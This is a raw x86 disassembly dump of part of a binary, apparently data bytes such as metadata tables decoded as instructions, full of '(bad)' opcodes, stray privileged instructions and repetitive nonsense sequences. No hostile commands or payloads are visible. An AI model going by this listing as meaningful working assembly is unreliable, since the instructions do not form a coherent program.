  406ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  406ff5:	16                   	push   %ss
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 0e 07 c3       	mov    0xc3070e02,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 c3                	add    %eax,%ebx
  407001:	18 01                	sbb    %al,(%ecx)
  407003:	05 99 02 07 15       	add    $0x15070299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 db                	add    %bl,%bl
  40700d:	07                   	pop    %es
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 61 0d             	add    0xd(%ecx),%ah
  407014:	c3                   	ret
  407015:	00 a1 02 1e 07 c7    	add    %ah,-0x38f8e1fe(%ecx)
  40701b:	00 89 02 0b 0d 4b    	add    %cl,0x4b0d0b02(%ecx)
  407021:	02 89 02 7a 0a 4b    	add    0x4b0a7a02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40702b:	1b 3e                	sbb    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	51                   	push   %ecx
  407031:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  407036:	6a 1b                	push   $0x1b
  407038:	c7 00 f9 02 07 15    	movl   $0x150702f9,(%eax)
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 0e                	add    (%esi),%cl
  407043:	0b 23                	or     (%ebx),%esp
  407045:	02 01                	add    (%ecx),%al
  407047:	03 07                	add    (%edi),%eax
  407049:	15 0e 00 01 03       	adc    $0x301000e,%eax
  40704e:	50                   	push   %eax
  40704f:	07                   	pop    %es
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 9b 14 47 02 c1    	add    %ebx,-0x3efdb8ec(%ebx)
  407059:	01 c5                	add    %eax,%ebp
  40705b:	17                   	pop    %ss
  40705c:	42                   	inc    %edx
  40705d:	02 09                	add    (%ecx),%cl
  40705f:	03 07                	add    (%edi),%eax
  407061:	15 6b 01 09 03       	adc    $0x309016b,%eax
  407066:	60                   	pusha
  407067:	19 6a 05             	sbb    %ebp,0x5(%edx)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	ef                   	out    %eax,(%dx)
  40706d:	14 70                	adc    $0x70,%al
  40706f:	05 19 03 f0 1a       	add    $0x1af00319,%eax
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d7                   	xlat   %ds:(%ebx)
  407079:	0f 7c                	(bad)
  40707b:	05 c1 01 0c 1a       	add    $0x1a0c01c1,%eax
  407080:	47                   	inc    %edi
  407081:	02 19                	add    (%ecx),%bl
  407083:	03 dc                	add    %esp,%ebx
  407085:	1b bf 01 81 02 d1    	sbb    -0x2efd7eff(%edi),%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	77 00                	ja     0x407092
  407092:	f4                   	hlt
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	51                   	push   %ecx
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 7e 07             	add    %edi,0x7(%esi)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	40                   	inc    %eax
  4070a3:	07                   	pop    %es
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	06                   	push   %es
  4070a9:	11 93 05 c1 01 c3    	adc    %edx,-0x3cfe3efb(%ebx)
  4070af:	18 99 05 49 03 07    	sbb    %bl,0x7034905(%ecx)
  4070b5:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070ba:	5b                   	pop    %ebx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	1f                   	pop    %ds
  4070c1:	0d 75 01 69 00       	or     $0x690175,%eax
  4070c6:	07                   	pop    %es
  4070c7:	15 0e 00 21 02       	adc    $0x221000e,%eax
  4070cc:	6c                   	insb   (%dx),%es:(%edi)
  4070cd:	0c 70                	or     $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	d2 04 aa             	rolb   %cl,(%edx,%ebp,4)
  4070d5:	05 c1 01 d0 0c       	add    $0xcd001c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 49             	roll   $0x49,(%ecx)
  4070df:	14 47                	adc    $0x47,%al
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 eb                	add    %ebp,%ebx
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 e0 0f       	add    $0xfe00159,%eax
  4070ec:	1d 00 61 03 6c       	sbb    $0x6c036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	4e                   	dec    %esi
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b9 07 c3 05 59       	mov    $0x5905c307,%ecx
  407101:	03 cb                	add    %ebx,%ecx
  407103:	07                   	pop    %es
  407104:	c3                   	ret
  407105:	05 59 03 6c 0c       	add    $0xc6c0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	fc                   	cld
  40710f:	1a c9                	sbb    %cl,%cl
  407111:	05 79 03 07 15       	add    $0x15070379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 7a 06       	add    $0x67a0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 67 08       	add    $0x86700c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 67 08             	add    %ah,0x8(%edi)
  407128:	0e                   	push   %cs
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 07                	add    (%edi),%eax
  40712d:	15 36 02 0c 00       	adc    $0xc0236,%eax
  407132:	07                   	pop    %es
  407133:	15 0e 00 0c 00       	adc    $0xc000e,%eax
  407138:	2b 03                	sub    (%ebx),%eax
  40713a:	f5                   	cmc
  40713b:	05 0c 00 47 1b       	add    $0x1b47000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	78 1c                	js     0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 e5 10       	add    $0x10e501c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 f4                	add    %dh,%ah
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 fd                	add    %bh,%ch
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 74 03 17          	add    %dh,0x17(%ebx,%eax,1)
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	71 1d                	jno    0x407181
  407164:	1d 06 69 00 07       	sbb    $0x7006906,%eax
  407169:	15 01 03 61 00       	adc    $0x610301,%eax
  40716e:	07                   	pop    %es
  40716f:	15 2d 06 91 03       	adc    $0x391062d,%eax
  407174:	67 08 0e 00 99       	or     %cl,-0x6700
  407179:	03 07                	add    (%edi),%eax
  40717b:	15 56 04 a1 03       	adc    $0x3a10456,%eax
  407180:	bb 0b 35 06 81       	mov    $0x8106350b,%ebx
  407185:	02 20                	add    (%eax),%ah
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40718d:	1c 35                	sbb    $0x35,%al
  40718f:	05 91 02 c1 0a       	add    $0xac10291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	82 05 47 02 91 02 a7 	addb   $0xa7,0x2910247
  40719f:	1c 54                	sbb    $0x54,%al
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b8 0a 7c 05 91    	add    -0x6efa83f6(%eax),%bh
  4071a9:	02 a1 0a 6b 01 91    	add    -0x6efe94f6(%ecx),%ah
  4071af:	02 c1                	add    %cl,%al
  4071b1:	1c 5e                	sbb    $0x5e,%al
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 71 05             	add    0x5(%ecx),%dh
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 2b                	add    %ch,(%ebx)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 b0 1b       	add    $0x1bb003b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	ef                   	out    %eax,(%dx)
  4071c9:	14 92                	adc    $0x92,%al
  4071cb:	06                   	push   %es
  4071cc:	24 00                	and    $0x0,%al
  4071ce:	f0 1a a4 06 1c 00 ec 	lock sbb 0xaec001c(%esi,%eax,1),%ah
  4071d5:	0a 
  4071d6:	a9 06 24 00 dc       	test   $0xdc002406,%eax
  4071db:	1b bf 01 c9 03 c2    	sbb    -0x3dfc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 21    	adc    %dh,0x2103c906(%ebx)
  4071e7:	03 b9 06 d1 03 2e    	add    0x2e03d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	f3 04 c8             	repz add $0xc8,%al
  4071f5:	06                   	push   %es
  4071f6:	d9 03                	flds   (%ebx)
  4071f8:	11 06                	adc    %eax,(%esi)
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 bc 08 d8 06 01 04 	add    0x40106d8(%eax,%ecx,1),%edi
  407204:	d7                   	xlat   %ds:(%ebx)
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	bc 08 17 07 2c       	mov    $0x2c071708,%esp
  40720f:	00 73 19             	add    %dh,0x19(%ebx)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	9e                   	sahf
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	07                   	pop    %es
  40721d:	15 0e 00 c1 01       	adc    $0x1c1000e,%eax
  407222:	af                   	scas   %es:(%edi),%eax
  407223:	1d 84 00 21 04       	sbb    $0x4210084,%eax
  407228:	07                   	pop    %es
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	07                   	pop    %es
  40722f:	15 59 07 29 04       	adc    $0x4290759,%eax
  407234:	bb 16 61 07 51       	mov    $0x51076116,%ebx
  407239:	01 37                	add    %esi,(%edi)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	07                   	pop    %es
  407241:	15 6b 01 59 02       	adc    $0x259016b,%eax
  407246:	07                   	pop    %es
  407247:	15 0e 00 31 04       	adc    $0x431000e,%eax
  40724c:	07                   	pop    %es
  40724d:	15 0e 00 51 04       	adc    $0x451000e,%eax
  407252:	63 0b                	arpl   %ecx,(%ebx)
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 00                	add    $0x0,%al
  407259:	0b 01                	or     (%ecx),%eax
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	02 05 7a 07 51 04    	add    0x451077a,%al
  407264:	af                   	scas   %es:(%edi),%eax
  407265:	0b 81 07 51 04 9f    	or     -0x60fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	95                   	xchg   %eax,%ebp
  407271:	02 0e                	add    (%esi),%cl
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	2c 15                	sub    $0x15,%al
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 07             	cmp    %eax,(%edi,%eax,1)
  40727d:	15 8e 07 51 04       	adc    $0x451078e,%eax
  407282:	87 02                	xchg   %eax,(%edx)
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 52             	cmp    %eax,(%edx,%edx,2)
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	07                   	pop    %es
  40728f:	15 2b 02 59 02       	adc    $0x259022b,%eax
  407294:	78 1c                	js     0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 1f                	add    (%edi),%ebx
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	07                   	pop    %es
  4072a1:	15 6b 01 51 04       	adc    $0x451016b,%eax
  4072a6:	8e 02                	mov    (%edx),%es
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 1c                	add    $0x1c,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	83 0d 23 02 81 04 32 	orl    $0x32,0x4810223
  4072b9:	1d be 07 91 04       	sbb    $0x49107be,%eax
  4072be:	5b                   	pop    %ebx
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 07 15 0e       	mov    0xe150704,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 cf                	add    %ecx,%edi
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 bb 16 99 01 49    	add    0x49019916(%ebx),%bh
  4072d5:	02 bb 16 ab 01 a9    	add    -0x56fe54ea(%ebx),%bh
  4072db:	00 07                	add    %al,(%edi)
  4072dd:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072e2:	d7                   	xlat   %ds:(%ebx)
  4072e3:	0f 06                	clts
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	47                   	inc    %edi
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	cc                   	int3
  4072ef:	12 0e                	adc    (%esi),%cl
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 78 17             	add    %edi,0x17(%eax)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 97 0a 28 08 49    	add    %dl,0x4908280a(%edi)
  4072ff:	02 bb 16 a5 01 51    	add    0x5101a516(%ebx),%bh
  407305:	01 b6 00 32 08 c1    	add    %esi,-0x3ef7ce00(%esi)
  40730b:	01 41 10             	add    %eax,0x10(%ecx)
  40730e:	47                   	inc    %edi
  40730f:	02 a9 04 75 08 37    	add    0x37087504(%ecx),%ch
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	b6 00                	mov    $0x0,%dh
  40731a:	3c 08                	cmp    $0x8,%al
  40731c:	51                   	push   %ecx
  40731d:	01 b6 00 41 08 51    	add    %esi,0x51084100(%esi)
  407323:	01 b6 00 46 08 51    	add    %esi,0x51084600(%esi)
  407329:	01 d7                	add    %edx,%edi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 75 08             	add    0x8(%ebp),%esi
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	d7                   	xlat   %ds:(%ebx)
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 d7                	add    %edx,%edi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 d7                	add    %edx,%edi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 bd 05 68 08 b1    	add    %edi,-0x4ef797fb(%ebp)
  40734d:	04 75                	add    $0x75,%al
  40734f:	08 6d 08             	or     %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 bb 16 7a 08 59    	add    0x59087a16(%ebx),%bh
  407359:	03 48 1d             	add    0x1d(%eax),%ecx
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	07                   	pop    %es
  407361:	15 88 08 c1 00       	adc    $0xc10888,%eax
  407366:	8e 0a                	mov    (%edx),%cs
  407368:	f4                   	hlt
  407369:	01 89 01 07 15 6b    	add    %ecx,0x6b150701(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e9 00 b6 08 49       	jmp    0x49492977
  407377:	02 3a                	add    (%edx),%bh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 bd       	mov    $0xbd024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	6e                   	outsb  %ds:(%esi),(%dx)
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	b6 00                	mov    $0x0,%dh
  40738c:	d2 08                	rorb   %cl,(%eax)
  40738e:	49                   	dec    %ecx
  40738f:	02 f2                	add    %dl,%dh
  407391:	00 d9                	add    %bl,%cl
  407393:	08 49 02             	or     %cl,0x2(%ecx)
  407396:	d7                   	xlat   %ds:(%ebx)
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	bb 16 12 09 d1       	mov    $0xd1091216,%ebx
  4073a1:	04 07                	add    $0x7,%al
  4073a3:	15 28 09 09 00       	adc    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 66 1a             	add    %ah,0x1a(%esi)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 4a 1a             	add    %cl,0x1a(%edx)
  4075c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 a3 13 a9 00 00    	add    %ah,0xa913(%ebx)
  4075cd:	00 2f                	add    %ch,(%edi)
  4075cf:	0b ae 00 00 00 e0    	or     -0x20000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 e2    	sbb    %ebp,-0x1e000000(%esi)
  4075db:	0a b2 00 00 00 5f    	or     0x5f000000(%edx),%dh
  4075e1:	03 b7 00 00 00 ff    	add    -0x1000000(%edi),%esi
  4075e7:	02 bb 00 00 00 99    	add    -0x67000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 03    	or     0x3000000(%edx),%esi
  4075f3:	0f bf 00             	movswl (%eax),%eax
  4075f6:	00 00                	add    %al,(%eax)
  4075f8:	fe 0c b7             	decb   (%edi,%esi,4)
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 aa 1a c3 01 00    	add    %ch,0x1c31a(%edx)
  407603:	00 db                	add    %bl,%bl
  407605:	0f f8 01             	psubb  (%ecx),%mm0
  407608:	00 00                	add    %al,(%eax)
  40760a:	9e                   	sahf
  40760b:	0d fe 01 00 00       	or     $0x1fe,%eax
  407610:	ac                   	lods   %ds:(%esi),%al
  407611:	0c 69                	or     $0x69,%al
  407613:	02 00                	add    (%eax),%al
  407615:	00 e3                	add    %ah,%bl
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	0e                   	push   %cs
  40761d:	19 71 02             	sbb    %esi,0x2(%ecx)
  407620:	00 00                	add    %al,(%eax)
  407622:	8f                   	(bad)
  407623:	1c 75                	sbb    $0x75,%al
  407625:	02 00                	add    (%eax),%al
  407627:	00 01                	add    %al,(%ecx)
  407629:	08 7a 02             	or     %bh,0x2(%edx)
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
